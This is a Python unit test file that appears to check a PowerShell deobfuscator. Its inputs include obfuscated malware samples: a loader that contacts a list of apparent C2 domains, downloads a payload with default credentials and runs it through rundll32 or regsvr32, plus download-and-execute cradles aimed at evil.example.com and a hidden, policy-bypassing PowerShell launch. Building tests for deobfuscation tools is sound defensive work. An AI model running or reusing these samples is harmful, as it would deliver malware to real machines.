from .. import TestUnitBase

import base64
import gzip
import lzma
import zlib
import inspect


class TestPs1RealWorldSmall(TestUnitBase):

    def test_format_string_evaluation(self):
        data = (
            b'''(  ITeM  VarIAbLe:2OF09b  ).VaLue::"dEFauLtneTwORkcrEdEnTiALs"'''
            b''';.("{1}{0}"-f'wr','i')'''
            b'''("{4}{0}{8}{2}{3}{1}{5}{6}{7}"-f'/',':443','.','.com','http:/','/','download/p','owershell/','example')'''
        )
        deob = self.load()
        result = data | deob | str
        self.assertIn('example..com', result)

    def test_string_replace_chain(self):
        data = (
            b"'hfTdH8C6z2Wr6qQRvil.z2Wr6qQRxamplz2Wr6qQR.cs97YMGcyg0WCrm/bs97YMGcyg0WCrs97YMGcyg0WCrm'"
            b".Replace('fTdH8C6','ttps://')"
            b".Replace('s97YMGcyg0WCr','o')"
            b".Replace('z2Wr6qQR', 'e')"
        )
        result = data | self.load() | bytearray
        self.assertIn(b'https://evil.example.com/boom', result)

    def test_braced_variable_with_scope(self):
        data = b'${env:ComputerName}'
        result = data | self.load() | str
        self.assertIn('$env:ComputerName', result)
        self.assertNotIn('$drive:', result)

    def test_param_block_with_attributes(self):
        data = b'function F { [CmdletBinding()] param($x) $x }'
        result = data | self.load() | str
        self.assertIn('param', result.lower())
        self.assertIn('CmdletBinding', result)

    def test_command_arguments_after_expression_name(self):
        data = b"&('Get-WmiObject') -Class Win32_processor"
        result = data | self.load() | str
        self.assertIn('Get-WmiObject', result)
        self.assertIn('-Class', result)
        self.assertIn('Win32_Processor', result)

    def test_foreach_with_external_variable(self):
        data = b"$key = $env:K\n'65,66,67'.Split(',') | %{ [Char]([Int]$_ -bxor $key) }"
        result = data | self.load() | str
        self.assertIn('-BXor', result.replace('-bxor', '-BXor'))
        self.assertIn('$key', result)

    def test_foreach_as_cast(self):
        data = (
            b"'55r152r157r151r116r50r40' -Split 'r' "
            b"| ForEach-Object { [Convert]::ToInt16($_.ToString(), 8) -As [Char] }"
        )
        result = data | self.load() | str
        self.assertIn('-joiN( ', result)

    def test_set_alias_inlining(self):
        data = b"sal myAlias New-Object; myAlias Net.WebClient"
        result = data | self.load() | str
        self.assertIn('New-Object Net.WebClient', result)

    def test_set_alias_with_named_params(self):
        data = b"Set-Alias -Name foo -Value Invoke-Expression; foo 'Write-Host hello'"
        result = data | self.load() | str
        self.assertIn('Write-Host', result)
        self.assertIn('hello', result)

    def test_string_join_static(self):
        data = b"[String]::Join('', @('Hello', ' ', 'World'))"
        result = data | self.load() | str
        self.assertIn('Hello World', result)

    def test_alias_survives_iex_inlining(self):
        data = b"sal x Invoke-Expression; x '[String]::Join('''', @(''Write'', ''-Host''))'"
        result = data | self.load() | str
        self.assertIn('Write-Host', result)

    def test_case_normalization(self):
        data = (
            b"function Ge {\n"
            b"[CmdletBinding()]\n"
            b"param (\n"
            b"[parameter(ValueFromPipeline=${t`RUE}, ValueFromPipelineByPropertyName=${tR`UE})]\n"
            b"[Alias(('nam'+'e'))]\n"
            b"${f`Rk}=${en`V:`CompuT`ERN`A`Me}\n"
            b")\n"
            b"${An`Tivi`RU`SPr`oD`UCT} = .('gwm'+'i') -Namespace root\\securitycenter2 "
            b"-Class AntiVirusProduct -ComputerName ${F`Rk}\n"
            b"}\n"
        )
        result = data | self.load() | str
        self.assertIn('$env:', result)
        self.assertNotIn('$drive:', result)
        self.assertIn('-Class', result)
        self.assertIn('-Namespace', result)
        self.assertIn('$True', result)
        self.assertIn('root\\securitycenter2', result)
        self.assertNotIn('-\n', result)

    def test_iex_compressed_payload(self):
        code = b"Write-Host 'hello'"
        compressed = zlib.compress(code, 9)[2:-4]  # raw deflate
        b64 = base64.b64encode(compressed).decode()
        data = (
            F"Invoke-Expression (New-Object System.IO.StreamReader("
            F"(New-Object IO.Compression.DeflateStream("
            F"[IO.MemoryStream][Convert]::FromBase64String('{b64}'),"
            F"[IO.Compression.CompressionMode]::Decompress)),"
            F"[Text.Encoding]::ASCII)).ReadToEnd()"
        ).encode()
        result = data | self.load() | str
        self.assertIn('Write-Host', result)
        self.assertIn('hello', result)

    def test_iex_gzip_payload(self):
        code = b"Write-Host 'world'"
        compressed = gzip.compress(code)
        b64 = base64.b64encode(compressed).decode()
        data = (
            F"Invoke-Expression (New-Object System.IO.StreamReader("
            F"(New-Object IO.Compression.GZipStream("
            F"[IO.MemoryStream][Convert]::FromBase64String('{b64}'),"
            F"[IO.Compression.CompressionMode]::Decompress)),"
            F"[Text.Encoding]::ASCII)).ReadToEnd()"
        ).encode()
        result = data | self.load() | str
        self.assertIn('Write-Host', result)
        self.assertIn('world', result)

    def test_expandable_string_void_subexpr_hoisted(self):
        data = b""""$( Set-Variable 'OFS' '' )" + 'Write-Host hello' + "$( Set-Variable 'OFS' ' ' )" | Invoke-Expression"""
        result = data | self.load() | str
        self.assertIn('$OFS', result)
        self.assertIn('Write-Host', result)
        self.assertIn('hello', result)
        self.assertNotIn('Invoke-Expression', result)

    def test_iex_command_parameter(self):
        data = b"Invoke-Expression -Command 'Write-Host hello'"
        result = data | self.load() | str
        self.assertIn('Write-Host', result)
        self.assertIn('hello', result)
        self.assertNotIn('Invoke-Expression', result)

    def test_iex_abbreviated_command_parameter(self):
        data = b"iex -Co 'Write-Host hello'"
        result = data | self.load() | str
        self.assertIn('Write-Host', result)
        self.assertIn('hello', result)
        self.assertNotIn('Invoke-Expression', result)

    def test_piped_iex_command_parameter(self):
        data = b"'Write-Host hello' | Invoke-Expression -Command"
        result = data | self.load() | str
        self.assertIn('Write-Host', result)
        self.assertIn('hello', result)
        self.assertNotIn('Invoke-Expression', result)

    def test_type_aware_member_case_normalization(self):
        data = b"$r = New-Object Random; $r.nExT(100)"
        result = data | self.load() | str
        self.assertIn('.Next(', result)
        self.assertNotIn('.nExT(', result)

    def test_type_aware_static_member_case_normalization(self):
        data = b'[System.Threading.Thread]::cUrReNtThReAd.aPaRtMeNtStAtE'
        result = data | self.load() | str
        self.assertIn('CurrentThread', result)
        self.assertIn('ApartmentState', result)

    def test_array_reverse(self):
        data = (
            b"$x = @('d','l','r','o','W',' ','o','l','l','e','H')\n"
            b"$y = $x\n"
            b"[Array]::Reverse($x)\n"
            b"$msg = -Join $y\n"
            b"Write-Output $msg\n"
        )
        result = data | self.load() | str
        self.assertIn('Hello World', result)


class TestPs1RealWorldLarge(TestUnitBase):

    def test_real_world_01(self):
        data = (
            B'''&('set-varIAbLE') gHc7R6XtR8aE 16;.('SET-vaRIabLE') PkfYKFVSBTmn 27;.(.   ('{2}{0}{1}'-f'c','m','g\''''
            B''')    ('{4}{2}{3}{0}{5}{6}{7}{8}{6}{9}{1}{2}'-f'-','l','e','t','s','v','a','r','i','b')) EUCsMplIyR03'''
            B''' 43;&(&('{0}{1}{2}'-f'g','c','m')"seT-VARiaBLe") F8riv8rRCqrK((((&"get-vARiaBle" gHc7R6XtR8aE).('vaL'''
            B'''UE')+29)-AS[chaR]).('tOsTrinG').iNVoke()+(((."GeT-VaRIAblE" PkfYKFVSBTmn).('{4}{2}{0}{1}{3}'-f'l','u'''
            B'''','a','e','v')+74)-as[CHAR]).('tosTrInG').INVOke()+(((&"gEt-VarIabLe" EUCsMplIyR03)."VaLUE"+56)-as[c'''
            B'''HAr]).('{4}{2}{5}{4}{3}{1}{0}{6}'-f'n','i','o','r','t','s','g').INvOke());PowERsHELL -NONiNtErac -nO'''
            B'''LOgo -NOP -Windows HIDDEn -ExEC BYpasS (    .('{7}{4}{9}{0}{2}{3}{1}{6}{3}{5}{8}{4}'-f'-','r','v','a'''
            B'''','e','b','i','g','l','t') F8riv8rRCqrK).('{4}{3}{1}{0}{2}'-f'u','l','e','a','v')    .('{5}{2}{6}{5}'''
            B'''{4}{0}{1}{3}'-f'i','n','o','g','r','t','s').iNvokE()'''
        )
        result = data | self.load() | str
        self.assertEqual(result, "PowerShell -NONiNtErac -NoLogo -NOP -Windows HIDDEn -ExEC BYpasS '-ec'")

    def test_real_world_02(self):
        data = (
            B"""sEt-iTEM ('v'+'aria'+'bLE:'+'s2P4'+'O')  (  [Type]("{1}{0}" -F'vERt','CON')  ); Set-ITeM  ('varIablE"""
            B"""'+':'+'t51') ([type]("{7}{1}{0}{3}{6}{5}{4}{2}"-F 'omPReSsion.cOMP','O.C','E','rE','oNmOd','SI','s',"""
            B"""'i')  )  ;seT-VARiaBlE  ("t"+"u49Q") ( [type]("{2}{3}{4}{0}{1}{5}" -f'c','EpoIn','NeT.S','e','RvI','"""
            B"""tmanAgeR')  );   SET  ("{1}{0}" -f'vYp','7')  (  [TyPE]("{0}{6}{4}{1}{7}{5}{3}{2}" -f 'NET.se','yP',"""
            B"""'PE','y','uriT','Olt','C','rOtoC')  )  ; SET ('CUw'+'3')  ([TYpE]("{5}{2}{7}{3}{0}{1}{4}{6}" -f 'pOi"""
            B"""','N','YSTeM','ervIcE','Tm','s','aNAGER','.Net.S') ) ; ${b`x1`4N}  =  [tYPE]("{1}{2}{0}" -F'T','Net."""
            B"""We','breqUeS')  ; ${Yn4U`15} =  [tYpE]("{3}{2}{0}{1}"-F'ch','E','nTiAlcA','neT.CrEDE')  ;SET-iteM  ("""
            B""""{3}{0}{1}{2}" -f 'bLe:','TQ','4pIV','VARia') (  [tyPE]("{0}{2}{4}{1}{3}" -f 'Te','d','Xt','INg','.E"""
            B"""ncO') );sv ("{1}{0}" -f'9PUc','Xt') ([tYPE]("{2}{1}{0}"-f 'E','Il','Io.f')  ) ; ${rU`o3}= [TypE]("{2"""
            B"""}{0}{1}"-F 'V','AtoR','aCti') ;  SeT-itEM  ('VariA'+'bl'+'E:Ipjn')  ([type]("{0}{1}"-f 'TY','PE') );"""
            B""" ${r`o}=("{1}{2}{0}" -f'.1','127','.0.0');${r`EU} = P`ING ${r`O};if (${R`eU} -match ("{1}{0}"-f 'evu"""
            B"""t','ic')){${Ks}=ge`T`-RaNdOm -Max 11;function tR`iomE(${T`e}){${I`i}= (gi ('V'+'AriA'+'BlE:'+'s2p4'+"""
            B"""'O')  ).vaLue::("{2}{1}{0}{3}" -f'se','mBa','Fro','64String').Invoke(${te});return ${ii}};function a"""
            B"""S(${S`A}){-join((${s`A}."le`N`gTh"-1)..0|foreacH-`oB`J`EcT{${sA}[${_}]})};${b`Iz}=$(g`ET-`wmIoBj`eCT"""
            B""" ("{1}{5}{2}{6}{3}{4}{0}"-f't','Win32','mp','stemProd','uc','_Co','uterSy') -computername ('.') | S`"""
            B"""eL`ECt-`ObjEct -ExpandProperty ("{0}{1}" -f 'U','UID'));function NI`Ll(${T`yo}){${kj}=nE`w`-`oBJeCt """
            B"""("{3}{0}{2}{1}"-f'O.Mem','tream','oryS','I')(,${T`yo});${m`m}=(NEW`-o`BJEct ("{0}{3}{2}{4}{1}"-f'IO."""
            B"""','r','mRead','Strea','e')(N`EW-`OBJ`eCt ("{2}{0}{3}{4}{1}{5}{6}"-f 'mpr','pStr','IO.Co','ession.Gz'"""
            B""",'i','ea','m')(${Kj}, ( gEt-varIablE  ("t5"+"1")).vAlUE::"D`e`COMPRESs"))).("{1}{2}{0}" -f 'ToEnd','"""
            B"""R','ead').Invoke();return ${m`m}};function t{${Z}=@(("{1}{2}{3}{0}"-f 'm','mictosof','ts','.co'),("{"""
            B"""2}{1}{0}{3}{4}"-f'rs.','e','qartabe','c','om'),("{5}{1}{4}{2}{0}{3}"-f 'iadelleentrat','g','z','e.si"""
            B"""te','en','a'),("{1}{2}{3}{0}"-f 'm','teslao','ilcar','.co'),("{0}{1}{4}{2}{3}"-f 'h','o','.','com','"""
            B"""likokooo'),("{1}{0}{2}{3}{4}"-f'l','ub','a','znze.','online'),("{3}{2}{1}{0}"-f'icu','.','ak','hiter"""
            B"""on'),("{1}{2}{0}" -f'te','ab','rakam.si'));${z}=${Z}|s`oRT-`obJE`Ct {GeT`-raND`om};Foreach(${T} in $"""
            B"""{Z}){if(.("{1}{2}{4}{3}{0}"-f 'n','T','est-Co','ectio','nn') (${t}) -Count 1 -quiet){${Rr}=${T};}};r"""
            B"""eturn ''+'ht'+'tp'+("{1}{0}" -f '://','s')+${r`R}+'/'+''};function O`sI{${rY}=&('T');${m}=${R`Y}+'?'"""
            B'''+${B`Iz};  (  Ls ('V'+'ARIabl'+'E:'+'Tu'+'49Q')).VAlUe::"Se`cUR`i`TyP`RoTO`COL"= (  GEt-vaRiABle  ("'''
            B"""{0}{1}" -f '7v','YP') -Value)::"T`Ls"; (  get-cHildiTem  ('vArIaB'+'Le'+':cuW'+'3')  ).VaLUe::"s`eR`"""
            B"""VerceRtI`FI`c`A`TEVAliDat`iOnCAllb`ACK"={${T`Rue}};${a}=&("{2}{1}{0}" -f 't','objec','new-') ("{2}{1"""
            B"""}{0}" -f 'nt','ie','net.webcl');${A}."Pro`Xy"= (  vaRIABLe ('B'+'X14n') ).valUe::("{2}{3}{1}{0}{4}" """
            B"""-f 'eb','temW','G','etSys','Proxy').Invoke();${a}."pRO`xY"."crEDenTi`A`lS"= (  get-cHildITem ("{0}{1"""
            B"""}{3}{2}{4}"-f'Var','i','bLE:Y','a','N4U15')).vaLue::"DeFAul`T`crED`eN`TiaLs";return &("{0}{1}"-f 'N'"""
            B""",'iLL')(${A}.("{2}{1}{3}{0}"-f 'a','nloadD','dow','at').Invoke(${m}))};.("{0}{1}"-f's','al') ("{0}{1"""
            B"""}"-f'ra','ndomG') ("{1}{2}{0}" -f'l32','run','dl');function K`eLv{${FD}=&("{1}{0}" -f 'i','os');${U}"""
            B"""=${Fd}.("{2}{0}{1}"-f 'ubst','ring','s').Invoke(0,1);${E`F}=${f`d}.("{1}{0}"-f 'move','re').Invoke(0"""
            B""",1);${o`o}=${EF} -split'!';${Vr}=  (  VaRIABLE  ("{1}{2}{0}"-f 'Piv','Tq','4')).VaLUE::"UT`F8";forea"""
            B"""ch(${O} in ${O`o}[0]){${o`UT}=@();${O`A}=${U}.("{2}{1}{0}"-f'ay','arArr','ToCh').Invoke();${O}=.("{0"""
            B"""}{1}"-f 'T','riome')(${o});for(${i}=0; ${I} -lt ${o}."cOU`NT"; ${I}++){${O`UT} += [char]([Byte]${O}["""
            B"""${I}] -bxor[Byte]${oA}[${i}%${O`A}."C`OUnT"])}};${sS}=${e`F}."r`E`plAcE"((${Oo}[0]+"!"),${V`R}."gE`T"""
            B"""strI`Ng"(${O`UT}));return ${s`S}};${a`ZQ}=${eN`V:t`eMP};${f`BF}=(${D}=.("{0}{1}" -f 'g','ci') ${a`Zq"""
            B"""}|&("{0}{1}{2}" -f'g','et-rand','om'))."nA`me" -replace ".{5}$";${H`B}=${a`Zq}+'\'+${F`Bf}+'.';funct"""
            B"""ion Cal`CC{${K`I}=.("{0}{1}" -f'kel','v');  ( gEt-vAriABlE  ("{0}{1}" -f 'xt9','Puc')  ).VALuE::("{2"""
            B'''}{1}{0}" -f 'tes','llBy','WriteA').Invoke(${h`B},(&("{0}{2}{1}" -f 'T','e','riom')(${k`i} -replace "'''
            B""".{200}$")));if((&("{0}{1}"-f 'g','ci') ${H`B})."l`En`GtH" -lt 256){exit};${iz}=.('as')(("{2}{0}{1}{3"""
            B"""}"-f 'evr','eSret','r','sigeRllD'));if (${ks} %2 -eq 0){&("{0}{1}" -f'ran','domG') ${hB} ${i`z};&("{"""
            B"""0}{1}"-f'slee','p') 35;}else{${m`J}= (vARIAblE  ('rUO'+'3')  -vALueONlY)::"CrEatEi`NSTa`NCE"( ${I`pj"""
            B"""n}::("{2}{0}{1}{3}"-f'ypefrom','cl','gett','sid').Invoke("{c08afd90-f2a1-11d1-8455-00a0c91f3880}"));"""
            B"""${Mj}."Doc`U`MeNt"."app`LI`CaT`iON"."Pa`REnT".("{1}{0}{2}"-f'hel','s','lexecute').Invoke(("{0}{1}"-f"""
            B"""'r','undll32'),(' '+"$Hb "+"$iZ"),("{3}{1}{0}{2}{4}" -f'ndowsSy','Wi','stem','C:','32'),${n`ULL},0);"""
            B"""&("{1}{0}" -f 'leep','s') 35};.('sl');.("{2}{1}{0}"-f'svr32','eg','r') ('/s') ${h`B} > ${Hb}};&("{0}"""
            B"""{1}"-f 'Ca','lcc')}else{exit}"""
        )
        result = data | self.load() | str
        for c2server in [
            'mictosofts.''com',
            'qartabeers.''com',
            'agenziadelleentrate.''site',
            'teslaoilcar.''com',
            'holikokooo.''com',
            'ublaznze.''online',
            'hiteronak.''icu',
            'abrakam.''site'
        ]:
            self.assertIn(c2server, result)

    def test_join_operator(self):
        data = (
            b"$ms = -Join ('Me', 'morySt', 'ream')\n"
            b"$rf = -Join ('Rfc2', '898', 'Derive', 'Bytes')\n"
            b"$xx = @($ms, 'rypto', $rf, 'esManag', 'rea')\n"
            b"$ua = ('Mozilla/5.0', '(Windows NT 10.0; Win64; x64)', 'AppleWebKit/537.36', '(KHTML,like Gecko)') -Join ' '\n"
            b"Write-Output $xx $ua\n"
            b"Write-Output $xx $ua\n"
        )
        result = data | self.load() | str
        self.assertNotIn('$ms', result)
        self.assertNotIn('$rf', result)
        self.assertIn('MemoryStream', result)
        self.assertIn('Rfc2898DeriveBytes', result)
        self.assertIn(
            "'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko)'", result)

    def test_pipe_to_percent_alias(self):
        data = b"& ('iex') (-join ('a','b','c'.Split('') | %{$_}))"
        result = data | self.load() | str
        self.assertNotIn(')\n)', result)
        self.assertEqual(result.count(')'), result.count('('))

    def test_real_world_03(self):
        data = (
            B"""$v='i'+''+'E'+'x';sal foo $v;$pzhhqdwl=foo(foo($($('(nQNVrd3W2GjJK36w-objQNVrd3W2GjJK36ct SystQNVrd3"""
            B"""W2GjJK36m.NQNVrd3W2GjJK36t.WQNVrd3W2GjJK36bCliQNVrd3W2GjJK36nt).Dos2Wr6qQRtring(''hfTdH8C6z2Wr6qQRvi"""
            B"""l.z2Wr6qQRxamplz2Wr6qQR.cs97YMGcyg0WCrm/bs97YMGcyg0WCrs97YMGcyg0WCrm''.Replace(''fTdH8C6'',''ttps://"""
            B"""'').Replace(''s97YMGcyg0WCr'',''o'').Replace(''z2Wr6qQR'', ''e''))').Replace('QNVrd3W2GjJK36', 'e')."""
            B"""Replace('s2Wr6qQR', 'wnloadS'))))"""
        )
        test = data | self.load() | str
        lines = test.splitlines()
        self.assertEqual(len(lines), 2)
        self.assertEqual(lines[1], 
            "$pzhhqdwl = Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://evil.example.com/boom'))")

    def test_real_world_04(self):
        data = lzma.decompress(base64.b85decode(
            r'''{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;4`xoJY4`22mwpqb!!Q5S=ID}{U?K5x?&Dq;lJ+F$KIshuz(HET`RD(!;GQ~`$;Z(#c_IW'''
            r'''j4+$z|45pL?{1ci^H?w<TpRr0QS^X>wqF^k3rRod0CO*E*`62^A4z`xV6fS}6xM4@fklECsejWV2euB<losA9ccs@L39bYH|MSdF'''
            r'''tAZ=@wl>xz$+>2dRE9l)68lDuI3C{0r`zAv4D|)6WL?iOycan~e?JYR=Q+-;7V?d~P8lB~J-u~Zo45s#p4Ode%i;u>8D|djZ2D}?'''
            r'''%7y;~Ux|E=v{xMSkiumAI7ayv>_NmvW+F<pWp>IP8HWA#B4OoJU(C_&K-@p%x5~(gyotevFLZ?cE+d}p-#E=h29f}j(TnOfci_r0'''
            r'''mR>g&Hgam3tj4e#cg;kbQfiMBH3-`pzNj_jjx-^}F}D=k9FBf0m*%N2wp&A<nG9H}Y8Y?uae%P0Rqr7ACjBoEZ%58HDxInaTjOYA'''
            r'''YX6j@d-2zwS1>6hdP0;&e~vzlNVabx$Xlbko0u=$g0F;6j`Cvk@Mna}FFw1kWj=#LX|=QJ>5Pm8xfREoFJ^8gSjcpygy7bS$Qn`&'''
            r'''w~<jyFf27nuLwrl(O7Oh%U~F`X<usFP2admS_c&t1bU(1iIZf*E%+v&2dmu>*DQJejTO-R_{rZFm<{sU=BElX1?VBPXzdkO^V4-c'''
            r'''eTi)eYugLvp;|&_{uxZy@hwJ=!#2ClG~lM+|Kj$EYuQm;IcMy_SE0WxaK8RzJY=l}eu0RIsb4QJl&8N~Op!->=SmzKcSAcfhsMoe'''
            r'''?k6IR4I`#t9BowK(ur<1Q^P0;D1ze|r4ed|_YV7aL-TZ6B~fg+PKAwrRvL5f{U;$qMu)sjWSft?FWIS&Jd;4=0Ydu?508!(bnEah'''
            r'''qdl*5RvwokXg9mNlfl8LP}D^B%Uy~`{HSN4-{C}LjvZnmrj@B*H7br`trfT43q4dET(;yVQ!1s|TvxVDq*}7^vO*Zm1I}>?a8dje'''
            r'''0Qp*~utJNW|Lpg1S>$+ZuSN3UFBajT{;YaIrG~F5K_W#9973tH!p!uilJ9WOkbBBj^t2fw5&$$H2mxp6z(F$L!1|^JcO^1#j2(I*'''
            r'''n!Ke;yJw=B063{Cr9W3C(S|?Xg1`I#u;>@Ctt-_{M^#j-a;XO?kTDVk{iXRXhFG&;D^nWpn;tasS3XkD-l2uwqVb9Bx~7)Avz3g#'''
            r'''3wZa3)mwi;8M}nP&p-oe;<}J~0y&&846mIFWk>imW?LVit+koLxtG9&|LseLowa|1H-;V=Fmj7jKrIBF!?t`0upNeCqRpVb?XhHh'''
            r'''&X3S&F=T69#MioDP+dIGasFm%B7e>^vp^h8yOD&jpPf(9?c7ACIDhS7tRZHFh%hPlrgb>xihPuCqEOL!gU2_n-|vknPkv4Bd8Iw?'''
            r'''83Y&vm>n1qk4;QNC$SH{k6HC&V_I1nk9-k6Sd4=|?U$Xl9~7OIi4l0TVLX*J0ah9)<y|ccWc;Af_JIkYHFC(PpRk&<AGoRM`9G|n'''
            r'''hIkgHK#Hq!cYLs)hb1e0gbn^=JSlh|BnW!3v_Vad=&O9opB8y6x*)0~7B$7?J+xJ@3gn1A&O1HTt3{kBiw%5&(JH-nn#ejTx_>)F'''
            r'''U34Ex3g8jJlBAfOk|9Q@kfq?XI^gy}mdED#3@@(?5*YiP(WQfnJ_nB^H-$wJvORR{VN;VYg7(+rFZ1_n$)iu)MpBWoA@uHr$kgO?'''
            r'''iT>(3Q;M~HiCV%UcE0kP0Iy!76F7M3hZU8U#oLn~ko3XS2PiRWF*8tY+PxIeSl1#1tUGvx55lC8%cPGwb;0W=Vny!=Aj&UY){#tj'''
            r'''C0P$+>@mJr=We=-ovAW@PqNCGJI)_=Mx0LBQCJ*_@*3^Ri<)tKN*Vq6*Dta8F;XM3ukSaGvYF%=FiG`OVZ?KURox-TtLyz2vcO%A'''
            r'''(ml(w^UBPCuk1?bHFrD(VX0aME{${YBnGp&fhBmPw+%g+ny3UqWAI%ywdt;9HNHZ-R_ln6(15tTm4Qso8-34y9mJx8t(qIcol2HH'''
            r'''{Fgnnmc3{<K}!%e0dS&oO-S)?fj0zQNcyVU3JmR~E)*Y3t|E&$bpLu{I>DVZmaxkso9M-JUcGgwktyDjQ0rtrn$L>bXu@(NA#ce?'''
            r'''RUPl<#dbBEzqI=?uNqdbM@Z1ru-O9uD3SH@2N5kz;S>?&P?N!IhgOEv%gx68QQU?2T2<TBu-&Zdri0b;q$lzLnQ@ro{!uA1Od5R1'''
            r'''fP~3nrXO<obH~;FO?i(MG4P#7>?1~8Ku(s?UX*}g*Z8j7F+JiAMlUAHcwf);@_oS*C$N|+-QY~R4tT0p3q;y_;By#M+}17A&lU%Q'''
            r'''_UDc!@5^e50#OnBnI!_Rt69>(OkatR!QUL6c$L<5z|v2!#U}LE9?4%!Y|E<WgGdBZWnRojEDTE_evs+YMTTu$59|WYoa=&rs5ep@'''
            r'''2bsCaCvvpIiljbl9!*LMVhC}0j4Go5xdlnAI`WF$yWX9F6B_D&_$Q7gAXIZHGC-r%hTc5`c{>YGPhP5AarkmVJoT}w$=*=PW&O8S'''
            r'''@7h6bt-!mFr!Dj*7!t`Usr?Jn(NR0aA|r)2MGsR*&e3c|ziO29dE?oSaF=sO_c_PW7`e|z^p6E@Ur+Q*8);~w4c`4e`iORw4PRFZ'''
            r'''W%vgRrSgm=bulI%AN26w8|mTLm{|W^ad0yCz%!pps{eG*D<}BkW(((nSfy85`^Ud&coqRxyxiaDn-2*p)R8mjjb!`oC@a2lo)k{Y'''
            r'''`jwfYr?;0yhYg0s2}e>+>=&TTcin7D-qvL2^hY;p9k*l3RcLoJMOeouN%C|r`6x%S_yXmJ@K`6}F_;=e)2ZAa4qdf98JQ<MlHKC+'''
            r'''fU>7=P!9mkiH`^LJ-ZR{@IZenIpQVq@*^de;kXXrL!r+qaaZkg%DpUnH3%`%yO9=wYM`(zBju%6=SA-!uVhJdN18zo`biRYhywIR'''
            r'''@BU<wu?k(ERba#U%%rY@v^(+f-n=t7L&L$%CWDZ@M|%;k{pa-pJ+Rff=5)aE^9`I>rpN(<frC(HL~dRiTv5O-yja%&m)~~Y#Xh=N'''
            r'''I%8QV4a!wt|A$nn%gy!X9+ajg=RnU&Hv{_)T?AZM68Tv|`>ebSN4A4}RJ?$Y-X(VwMw(b3F|x+?ZWvP&$i8SkuZBxtYMO4hX`RYO'''
            r'''kzVKCc{Fej$V`m#?x{~=*=WX_bVNIaVEMiEpU*pig3PO?)-BxEH5t`2MGrSE1$f<0`{$I($=mMaD~`2TVs;A85kYjwi`wtcNfKzm'''
            r'''?wbUG2@4lZ>4rh<>tEv>HQ)<Zszi|cWKTFF+v`@md@S8hhj~?>W)DZ-e|nW;6FM@`Ya*MzKRLc_CcQ*w2MJ?SsM^Q+m^QBubpJ@1'''
            r'''1cXp1mW?Bf^3CFbqYRAWo?%3*wp~RUEH`U$A$=VyX*_#I0sO3V+Ujc|8kP~^SU&1sNV_sn111)}q^SXsg{M|snMvvY+A2@piZsHK'''
            r'''^?Rg%_pwnP7Zpt&J?ZZXQQm~VX!!U72PhSIn1qg`omRmr6VyWaucbK&kBC%^#9CJhV(D@P|F!_TsTD7UlhRSDMdN#Wu(hS-zi~h5'''
            r'''zg~2(^)ZWr<-GQBlpwM+WM9q{n36_W<UO%_Jd<dk@J=$?%UWKj{n^or*lnj~mf|1+TJ7Bk<l7)ZeBPqS4w_j>`hg?=RZ%s%CE)NI'''
            r'''6=$GmP#oK|Q_<e7PifU7P-R;lz`U5DC+!2U5GwI=4q!HQ@;+n%HAbUT6F=llI^Wg(%NkX4%u@I8t{(FG^LhCQD$H-;C=~Fg9h}Gi'''
            r'''5T!6wpj<CudKCZvSw>LDH_mR;U!)9|F6xvQk+-zKWRS`f2&2r4TB-navGkTXs>C-4ALe#ljH74NcCMT>i?`L7s`m1Ny+8p9U=0xh'''
            r'''#d%U^?x{|=_;QibngEy7dhYTu@LpR2z6|m%*=$Qw$@SY*?XR}IOnfUo@ErHl?)hFO{8bN!mzt4+QG2CcDy=ipS_59Cl!&%?3du6R'''
            r'''PEiCLbVi7)Lcv^-QaK`_9i;bHidmXejWWn#`jY-y$qYq{);y^<+p!=l5hVftlY%X{a#pt;@uzv_jE|4cy%J^frb&T|eqUlq6|n+7'''
            r'''(av|ifDKSL26~cM%iL1S1@4za+b1Feh`Rx{%P4a;0ws<}7ZgJk;iHn?O}xpmVS_Bm_Yd)AFBpZFZ!)*bGf#rx6dXY+h}JcTE3P8k'''
            r'''6nj;AHg*^Bq@lRt<HHDVNd<g%a~N`V^oq%c4c`6*rylJ?_ssU<hpBu*C44H!9lrv>@Ukmu&q5miJpiUIX8?ryDq&p`lfOG);Kmz^'''
            r'''Ico5q`RV|*n<vxl%`3w<z3<{M-G0!lYBf(diEUwwE{jH$9tz>}Jq{=m!p|m1_W9he=9Qgs#17Kf5v|{-+_vCZ)<)_q>`)>zxUk}G'''
            r'''vSxz+u~>rgWGjmwiLkW+zNSx|wqKvy=!~)}fBrH23fQ`dq#7V)XEcjqrzG=r?%g$=OxFOj>?SPUwCvuol!tp=GR`q>)1KF^A5IV>'''
            r'''`dGE`&10TH7~OR`QqI(Z$KB~XEBeb-1T`)vXfYf;6W|dX={UHm9ShK#(hEY;#3g7Oapz20b@0P(KWpb>RXN%DQv2ZFBJx>xa~W{U'''
            r'''^yWWN${MYz{1<{P+;Fm3#79_(0)$-{?KqNvxQ{#?je1H?BT(c7qp$Da{`-`gsLT0fHDA|l`GSdhau@=pN&f-9iaZA~wO}1zjqKBO'''
            r'''rV!wqBHgNH{zV+JP}s5^q{_FPy`iUc335WwZZu1lY-7q{`kVkH_N{M8$`{2;F`BZ08Kdl3WdWUV2bo5I%QBpGGldelfh=-h#vo9c'''
            r'''gKK)I9Rnm0!oO}B11FO83#loM+*&%G?9xg5zvIvfQM};DXfDrNA@aUqPCV@I9&&Od@Z_7aZ^hL&934=1I~BAJs~#cAWbG!a(^V&M'''
            r'''FbY5#X4w5t;Oy=Ln6Lks(B{1p%}Mgc?%x;0Kd9^!yqyGdcMx6ylpcXZe%?#KyI<ZA6#Lg&0m_$|m7E2kNol)^RJhtr#oKt@y8szY'''
            r'''($0McvW?SuC2f1Z?W)zpNhL&?bW=-n2xntM^)%kT>!}Aj8iifKV=*`U+wy;&0h>Prh-ZV6NPxUv*<rzdj7G~WG`TlN=8^e<^CycM'''
            r'''XVZl5%M3pZOlKvo*ZdSOC~-rgD7_QwFGRgo?TGYN?yH7pZYp$lO#YNPR1aYWcrn5q`mytAQ#Wv2!a1ge;9RA_JV%FWQa|$8Jv`l>'''
            r'''V5YUOt+SEnyRyd{g>%zxZ3)?!hu;pyJty~{f@^9yzBjfD<G~l^GNke5;Rs~E4(+eX6qm_4ZC8PyRp%|6mj<FEO8u!TFbZhF=J(2_'''
            r'''ufn>(TNU@P=E3F*MJm_PeST2+9Mv6})(fYha_0}ooXQo(f*1lkZafEjMzcdmCbH*Zg_73o(K?^FE-NRRy;of~mu=8qJ%k|{?uu)A'''
